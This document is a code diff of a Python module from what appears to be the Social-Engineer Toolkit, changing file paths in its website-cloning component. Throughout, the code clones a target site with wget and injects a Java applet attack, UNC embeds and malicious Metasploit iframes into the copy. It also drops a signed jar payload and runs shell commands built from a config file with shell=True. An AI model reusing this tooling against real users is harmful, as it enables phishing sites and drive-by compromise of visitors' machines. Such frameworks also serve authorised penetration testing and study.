@@ -40,24 +40,24 @@ site_cloned = True
 meterpreter_iframe="8080"
 
 ## make dir if needed
-if not os.path.isdir("src/program_junk/web_clone/"):
-    os.makedirs("src/program_junk/web_clone")
+if not os.path.isdir(setdir + "/web_clone/"):
+    os.makedirs(setdir + "/web_clone")
 
 ## if we used a proxy configuration from the set-proxy
-if os.path.isfile("src/program_junk/proxy.confg"):
+if os.path.isfile(setdir + "/proxy.confg"):
 
-    fileopen=file("src/program_junk/proxy.config", "r")
+    fileopen=file(setdir + "/proxy.config", "r")
     proxy_config = fileopen.read().rstrip()
 
 ## just do a ls
-if not os.path.isfile("src/program_junk/proxy.confg"): proxy_config = "ls"
+if not os.path.isfile(setdir + "/proxy.confg"): proxy_config = "ls"
 
 ## if counter == 0: web_port=80
 
 webdav_meta=0
 ## see if exploit requires webdav
 try:
-    fileopen=file("src/program_junk/meta_config", "r")
+    fileopen=file(setdir + "/meta_config", "r")
     for line in fileopen:
         line=line.rstrip()
         match=re.search("set SRVPORT 80", line)
@@ -70,7 +70,7 @@ except:
 
 template=""
 ## Grab custom or set defined
-fileopen=file("src/program_junk/site.template","r").readlines()
+fileopen=file(setdir + "/site.template","r").readlines()
 for line in fileopen:
     line=line.rstrip()
     match=re.search("TEMPLATE=", line)
@@ -80,8 +80,8 @@ for line in fileopen:
 
 ## grab attack_vector specification
 attack_vector=""
-if os.path.isfile("src/program_junk/attack_vector"):
-    fileopen=file("src/program_junk/attack_vector", "r").readlines()
+if os.path.isfile(setdir + "/attack_vector"):
+    fileopen=file(setdir + "/attack_vector", "r").readlines()
     for line in fileopen:
         attack_vector=line.rstrip()
 
@@ -96,7 +96,7 @@ rand_gen_nix = generate_random_string(6, 15)
 
 try:
     ## open our config file that was specified in SET
-    fileopen=file("src/program_junk/site.template", "r").readlines()
+    fileopen=file(setdir + "/site.template", "r").readlines()
     ## start loop here
     url_counter=0
     for line in fileopen:
@@ -132,7 +132,7 @@ try:
                 wget = 1
 
             if wget == 1:
-                subprocess.Popen('%s;cd src/program_junk/web_clone/;wget --no-check-certificate -O index.html -c -k -U "%s" %s;' % (proxy_config,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                subprocess.Popen('%s;cd %s/web_clone/;wget --no-check-certificate -O index.html -c -k -U "%s" %s;' % (proxy_config,setdir,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
             if wget == 0:
                 # if we don't have wget installed we will use python to rip, not as good as wget
@@ -146,7 +146,7 @@ try:
                     # if the site has cloned properly
                     site_cloned = True
                     # open file for writing
-                    filewrite = file("src/program_junk/web_clone/index.html", "w")
+                    filewrite = file(setdir + "/web_clone/index.html", "w")
                     # write the data back from the request
                     filewrite.write(html)
                     # close the file
@@ -157,17 +157,17 @@ try:
             pass
 
         ## If the website did not clone properly, exit out.
-        if not os.path.isfile("src/program_junk/web_clone/index.html"):
+        if not os.path.isfile(setdir + "/web_clone/index.html"):
             print bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC
             return_continue()
             site_cloned = False
             ## add file to let set interactive shell know it was unsuccessful
-            filewrite=file("src/program_junk/cloner.failed" , "w")
+            filewrite=file(setdir + "/cloner.failed" , "w")
             filewrite.write("failed")
             filewrite.close()
 
-        if os.path.isfile("src/program_junk/web_clone/index.html"):
-            fileopen = file("src/program_junk/web_clone/index.html", "r")
+        if os.path.isfile(setdir + "/web_clone/index.html"):
+            fileopen = file(setdir + "/web_clone/index.html", "r")
             counter = 0
             for line in fileopen:
                 counter = counter + 1
@@ -175,26 +175,26 @@ try:
                 print bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC
                 return_continue()
                 site_cloned = False
-                os.remove("src/program_junk/web_clone/index.html")
+                os.remove(setdir + "/web_clone/index.html")
 
                 ## add file to let set interactive shell know it was unsuccessful
-                filewrite=file("src/program_junk/cloner.failed" , "w")
+                filewrite=file(setdir + "/cloner.failed" , "w")
                 filewrite.write("failed")
                 filewrite.close()
 
         if site_cloned == True:
 
             ## make a backup of the site if needed
-            shutil.copyfile("src/program_junk/web_clone/index.html", "src/program_junk/web_clone/index.html.bak")
+            shutil.copyfile(setdir + "/web_clone/index.html", setdir + "/web_clone/index.html.bak")
 
 
     if site_cloned == True:
 
         # if we specify UNC embedding
         if unc_embed == True:
-            fileopen=file("src/program_junk/web_clone/index.html","r")
+            fileopen=file(setdir + "/web_clone/index.html","r")
             index_database = fileopen.read()
-            filewrite = file("src/program_junk/web_clone/index.html", "w")
+            filewrite = file(setdir + "/web_clone/index.html", "w")
 
             ## Open the UNC EMBED
             fileopen4=file("src/webattack/web_clone/unc.database", "r")
@@ -214,7 +214,7 @@ try:
 
         ## check for java flag for multi attack
         multi_java=False
-        if os.path.isfile("src/program_junk/multi_java"):
+        if os.path.isfile(setdir + "/multi_java"):
             multi_java=True
 
         if attack_vector == "java" or multi_java:
@@ -223,16 +223,16 @@ try:
             print bcolors.RED + "[*] Injecting Java Applet attack into the newly cloned website." + bcolors.ENDC
             ## Read in newly created index.html
             time.sleep(2)
-            if not os.path.isfile("src/program_junk/web_clone/index.html"):
+            if not os.path.isfile(setdir + "/web_clone/index.html"):
                 ## trigger error that we were unable to grab the website :(
                 print_error("Unable to clone the website it appears. Email us to fix.")
                 sys.exit()
 
-            fileopen=file("src/program_junk/web_clone/index.html","r")
+            fileopen=file(setdir + "/web_clone/index.html","r")
             ## Read add-on for java applet
             fileopen2=file("src/webattack/web_clone/applet.database" , "r")
             ## Write to new file with java applet added
-            filewrite=file("src/program_junk/web_clone/index.html.new", "w")
+            filewrite=file(setdir + "/web_clone/index.html.new", "w")
             fileopen3=file("src/webattack/web_clone/repeater.database", "r")
 
             ## this is our cloned website
@@ -321,23 +321,23 @@ try:
         ## selection of browser exploits
         ## check to see if multiattack is in use
         multi_meta="off"
-        if os.path.isfile("src/program_junk/multi_meta"):
+        if os.path.isfile(setdir + "/multi_meta"):
             multi_meta="on"
 
         if attack_vector == "browser" or multi_meta=="on":
             print bcolors.RED + "[*] Injecting iframes into cloned website for MSF Attack...." + bcolors.ENDC
             ## Read in newly created index.html
             if attack_vector == "multiattack":
-                if os.path.isfile("src/program_junk/web_clone/index.html"): os.remove("src/program_junk/web_clone/index.html")
+                if os.path.isfile(setdir + "/web_clone/index.html"): os.remove(setdir + "/web_clone/index.html")
                 # check to see if the file is there first
-                if not os.path.isfile("src/program_junk/web_clone/index.html.new"):
-                    if os.path.isfile("src/program_junk/web_clone/index.html.bak"):
-                        shutil.copyfile("src/program_junk/web_clone/index.html.bak", "src/program_junk/web_clone/index.html.new")
-                if os.path.isfile("src/program_junk/web_clone/index.html.new"):
-                    shutil.copyfile("src/program_junk/web_clone/index.html.new", "src/program_junk/web_clone/index.html")
+                if not os.path.isfile(setdir + "/web_clone/index.html.new"):
+                    if os.path.isfile(setdir + "/web_clone/index.html.bak"):
+                        shutil.copyfile(setdir + "/web_clone/index.html.bak", setdir + "/web_clone/index.html.new")
+                if os.path.isfile(setdir + "/web_clone/index.html.new"):
+                    shutil.copyfile(setdir + "/web_clone/index.html.new", setdir + "/web_clone/index.html")
                 time.sleep(1)
-            fileopen=file("src/program_junk/web_clone/index.html","r").readlines()
-            filewrite=file("src/program_junk/web_clone/index.html.new", "w")
+            fileopen=file(setdir + "/web_clone/index.html","r").readlines()
+            filewrite=file(setdir + "/web_clone/index.html.new", "w")
             counter=0
             for line in fileopen:
                 counter=0
@@ -367,13 +367,12 @@ try:
             except: pass
             print bcolors.BLUE + "[*] Malicious iframe injection successful...crafting payload.\n" + bcolors.ENDC
 
-
         if attack_vector == "java" or attack_vector == "browser" or attack_vector == "multiattack":
-            if not os.path.isfile("src/program_junk/web_clone/Signed_Update.jar"):
-                shutil.copyfile("src/html/Signed_Update.jar.orig", "src/program_junk/web_clone/Signed_Update.jar")
+            if not os.path.isfile(setdir + "/web_clone/Signed_Update.jar"):
+                shutil.copyfile("src/html/Signed_Update.jar.orig", setdir + "/web_clone/Signed_Update.jar")
             ## move index.html to our main website
-            if os.path.isfile("src/program_junk/web_clone/index.html.new"):
-                shutil.move("src/program_junk/web_clone/index.html.new", "src/program_junk/web_clone/index.html")
+            if os.path.isfile(setdir + "/web_clone/index.html.new"):
+                shutil.move(setdir + "/web_clone/index.html.new", setdir + "/web_clone/index.html")
 
 ## catch keyboard control-c
 except KeyboardInterrupt:
